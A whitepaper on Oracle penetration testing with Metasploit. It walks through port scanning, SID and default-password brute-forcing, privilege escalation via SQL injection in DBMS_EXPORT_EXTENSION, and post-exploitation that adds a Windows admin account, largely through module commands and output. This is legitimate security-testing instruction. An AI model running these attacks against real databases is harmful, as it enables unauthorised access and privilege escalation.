# Oracle Penetration Testing Using the Metasploit Framework

**Authors:**
- Chris Gates
- Mario Ceballos
- Metasploit Project

## Abstract

Over the years, numerous Oracle exploits, SQL injection vulnerabilities, and post-exploitation techniques have emerged without a structured methodology or standardization. Most of these were simply random `.sql` files. Furthermore, no publicly available penetration testing frameworks have the capability to exploit built-in package SQL injection vulnerabilities for privilege escalation, data extraction, or gaining operating system access. This whitepaper introduces an Oracle penetration testing methodology and provides tools in the form of Metasploit auxiliary modules to break into "unbreakable" Oracle systems.

We have developed modules for version and SID enumeration, account brute-forcing, ported public (and some non-public) Oracle SQL injection vulnerabilities into SQLI modules (with IDS evasion examples for 10g/11g), OS interaction, and post-exploitation tasks. These modules are currently supported on Linux and macOS.

## Oracle Penetration Testing Methodology

1. **Locate a System Running Oracle**
2. **Determine Oracle Version**
3. **Determine Oracle SID**
4. **Guess/Bruteforce USERNAME/PASSWORD**
5. **Privilege Escalation via SQL Injection**
6. **Manipulate Data/Post Exploitation**
7. **Cover Tracks**

### Locating an Oracle System

Oracle installations can typically be found by performing port scanning in the target network block. The default Oracle listener port is 1521, but it can also listen on ports in the 1521-1540 range. You can discover Oracle instances by scanning common Oracle ports. For a list of common Oracle ports, refer to [this resource](http://www.red-database-security.com/whitepaper/oracle_default_ports.html).

```bash
cg@attack:~$ nmap -sV 192.168.0.100-105 -p 1521
Starting Nmap 4.85BETA8 ( http://nmap.org ) at 2009-06-18 15:25 EDT
Interesting ports on 192.168.0.100:
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS Listener
Interesting ports on 192.168.0.101:
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
```

You can also discover Oracle instances using search engines. Alex Kornbrust of Red-Database-Security has written two excellent whitepapers on this subject:
1. [Google Oracle Hacking](http://www.red-database-security.com/wp/google_oracle_hacking_us.pdf)
2. [Yahoo Oracle Hacking](http://www.red-database-security.com/wp/yahoo_oracle_hacking_us.pdf)

### TNS and Oracle Mixins for Metasploit

Two new mixins have been added to the Metasploit trunk:
- **TNS Mixin**: Allows Metasploit to craft TNS packets.
- **Oracle Mixin**: Wraps Oracle commands using additional libraries like `ruby-dbi`, `ruby-oci8`, and the Oracle `sqlplus` client.

#### TNS Mixin Example

```ruby
connect_data = "(CONNECT_DATA=(COMMAND=VERSION))"
pkt = tns_packet(connect_data)
sock.put(pkt)
res = sock.get_once(-1, 2)
puts res
disconnect
```

#### Oracle Mixin Example

The Oracle mixin handles connecting to the remote database, sending SQL queries, and disconnecting. The core functionality is in the `prepare_exec()` method.

```ruby
DBI.connect(
  "DBI:OCI8://#{datastore['RHOST']}:#{datastore['RPORT']}/#{datastore['SID']}",
  "#{datastore['DBUSER']}",
  "#{datastore['DBPASS']}"
)

function = "
CREATE OR REPLACE FUNCTION #{p} 
RETURN NUMBER AUTHID CURRENT_USER AS
PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
EXECUTE IMMEDIATE '#{datastore['SQL']}';
COMMIT;
RETURN(0);
END;
"

begin
  print_status("Sending function...")
  prepare_exec(function)
end
```

### Determine Oracle Version Using Metasploit Modules

A version scanner using the TNS mixin has been added to the Metasploit trunk.

```bash
msf auxiliary(tnslsnr_version) > info
       Name: Oracle tnslsnr Service Version Query.
    Version: 6479
    License: Metasploit Framework License (BSD)
Provided by: CG
Basic options:
  Name     Current Setting  Required  Description                                  
  ----     ---------------  --------  -----------                                  
  RHOSTS                    yes       The target address range or CIDR identifier  
  RPORT    1521             yes       The target port                              
  THREADS  1                yes       The number of concurrent threads             
Description:
  This module simply queries the tnslsnr service for the Oracle build.

msf auxiliary(tnslsnr_version) > set RHOSTS 192.168.0.100
RHOSTS => 192.168.0.100
msf auxiliary(tnslsnr_version) > run
[*] Host 192.168.0.100 is running: 32-bit Windows: Version 10.2.0.1.0 - Production
```

### Determine Oracle SID Using Metasploit Modules

For Oracle versions prior to 9.2.0.8, the SID can be directly requested. For newer versions, you need to guess, brute-force, or use other methods to determine the SID.

```bash
msf > use auxiliary/scanner/oracle/sid_enum
msf auxiliary(sid_enum) > set RHOSTS 192.168.0.105
RHOSTS => 192.168.0.105
msf auxiliary(sid_enum) > run
[*] Identified SID for 192.168.0.105: PLSExtProc
[*] Identified SID for 192.168.0.105: cyxt
[*] Identified SERVICE_NAME for 192.168.0.105: PLSExtProc
[*] Identified SERVICE_NAME for 192.168.0.105: cyxt
[*] Identified SERVICE_NAME for 192.168.0.105: cyxtXDB
[*] Auxiliary module execution completed
```

### Bruteforcing the SID

Use the Service ID (SID) list from Red-Database-Security and perform a dictionary attack.

```bash
msf auxiliary(sid_brute) > run
[*] Starting brute force on 192.168.0.103, using sids from /home/cg/evil/msf3/dev/data/exploits/sid.txt...
[*] Found SID 'ORCL' for host 192.168.0.103
[*] Auxiliary module execution completed
```

### Guess/Bruteforce USER/PASS

Use Pete Finniganâ€™s default password list.

```bash
msf auxiliary(brute_login) > run
[-] ORA-01017: invalid username/password; logon denied
[-] ORA-01017: invalid username/password; logon denied
[*] Auxiliary module execution completed
msf auxiliary(brute_login) > db_notes
[*] Time: Sat May 30 08:44:09 -0500 2009 Note: host=172.10.1.109 type=BRUTEFORCED_ACCOUNT data=SCOTT/TIGER
```

### SQL Injection for Privilege Escalation

Exploit an SQL injection bug in the DBMS_EXPORT_EXTENSION package to escalate privileges.

```bash
msf > use auxiliary/sqli/oracle/dbms_export_extension 
msf auxiliary(dbms_export_extension) > info
Name: SQL Injection via DBMS_EXPORT_EXTENSION.
Version: $Revision:$
Provided by: MC
Basic options:
  Name Current Setting Required Description 
  ---- --------------- -------- ----------- 
  SQL  GRANT DBA TO SCOTT  yes   no SQL to run. 
  DBPASS  TIGER  yes   The password to authenticate as. 
  DBUSER  SCOTT  yes   The username to authenticate as. 
  RHOST  127.0.0.1  yes   The Oracle host. 
  RPORT  1521  yes   The TNS port. 
  SID  DEMO  yes   The sid to authenticate with. 
Description:
  This module will escalate an Oracle DB user to DBA by exploiting an SQL injection bug in the DBMS_EXPORT_EXTENSION package.

msf auxiliary(dbms_export_extension) > set RHOST 192.168.100.25
RHOST => 192.168.100.25
msf auxiliary(dbms_export_extension) > set SID UNLUCKY
SID => UNLUCKY
msf auxiliary(dbms_export_extension) > run
[*] Sending package...
[*] Done...
[*] Sending body...
[*] Done...
[*] Sending declare...
[*] Done...
[*] Auxiliary module execution completed
```

### Post Exploitation

The primary module for post-exploitation is the `win32_exec` module, which creates a Java class to execute system commands, executes those commands, and then deletes the class.

```bash
msf auxiliary(win32exec) > set CMD "net user dba P@ssW0rd1234 /add"
CMD => net user dba P@ssW0rd1234 /add
msf auxiliary(win32exec) > run
[*] Creating MSF JAVA class...
[*] Done...
[*] Creating MSF procedure...
[*] Done...
[*] Sending command: 'net user dba P@ssW0rd1234 /add'
[*] Done...
[*] Auxiliary module execution completed
```

### Useful Sites for Oracle Hacking

- [Red-Database-Security](http://www.red-database-security.com/)
- [Pete Finnigan](http://www.petefinnigan.com/)
- [Rawlab](http://rawlab.mindcreations.com/)
- [0xdeadbeef.info](http://www.0xdeadbeef.info/)
- [DSEC RG](http://dsecrg.com/)
- [Database Security](http://www.databasesecurity.com/)
- [David Litchfield](http://www.davidlitchfield.com/security.htm)
- [NGS Software](http://www.ngssoftware.com/research/)
- [Inguma](http://sourceforge.net/projects/inguma)
- [Oracle Forensics](http://www.oracleforensics.com/wordpress/)

### Dependency Installation Instructions

#### Oracle Mixin Install Notes for Linux

- Tested on Ubuntu 8.10 & 9.04
- Start with a working version of Metasploit trunk

##### Install Oracle Instant Client

- Download from [Oracle's website](http://www.oracle.com/technology/software/tech/oci/instantclient/index.html)
- Recommend Instant Client 10 for compatibility with Oracle 8, 9, 10, and 11

```bash
cd /opt/oracle
unzip /opt/oracle/oracle-instantclient-basic-10.2.0.4-1.i386.zip
unzip /opt/oracle/oracle-instantclient-sqlplus-10.2.0.4-1.i386.zip
unzip /opt/oracle/oracle-instantclient-devel-10.2.0.4-1.i386.zip
ln -s libclntsh.so.10.1 libclntsh.so
```

##### Set Up Environment

Add the following to your `.bashrc`:

```bash
export PATH=$PATH:/opt/oracle/instantclient_10_2
export SQLPATH=/opt/oracle/instantclient_10_2
export TNS_ADMIN=/opt/oracle/instantclient_10_2
export LD_LIBRARY_PATH=/opt/oracle/instantclient_10_2
export ORACLE_HOME=/opt/oracle/instantclient_10_2
```

##### Install Ruby-DBI

- Download from [RubyForge](http://rubyforge.org/frs/download.php/12368/dbi-0.1.1.tar.gz)

```bash
tar xvzf dbi-0.1.1.tar.gz
cd ruby-dbi/
ruby setup.rb config --with=dbi,dbd_pg
ruby setup.rb setup
sudo ruby setup.rb install
```

##### Install Ruby-OCI8

- Download from [RubyForge](http://rubyforge.org/frs/download.php/28396/ruby-oci8-1.0.0.tar.gz)

```bash
tar xvzf ruby-oci8-1.0.0.tar.gz
cd ruby-oci8-1.0.0/
LD_LIBRARY_PATH=/opt/oracle/instantclient_10_2/
export LD_LIBRARY_PATH
make
sudo make install
```

##### Verify SQL*Plus

```bash
sqlplus
SQL*Plus: Release 10.2.0.4.0 - Production on Sun May 3 12:24:51 2009
Copyright (c) 1982, 2007, Oracle. All Rights Reserved.
Enter user-name:
```

##### Test the Oracle Modules

```bash
msf auxiliary(sql) > run
[*] Sending SQL...
[*] Oracle8i Enterprise Edition Release 8.1.7.0.0 - Production
[*] PL/SQL Release 8.1.7.0.0 - Production
[*] CORE 8.1.7.0.0 Production
[*] TNS for Solaris: Version 8.1.7.0.0 - Production
[*] NLSRTL Version 3.4.1.0.0 - Production
[*] Done...
[*] Auxiliary module execution completed
```

This document provides a comprehensive guide to conducting Oracle penetration testing using the Metasploit framework, including detailed steps and examples for each phase of the process.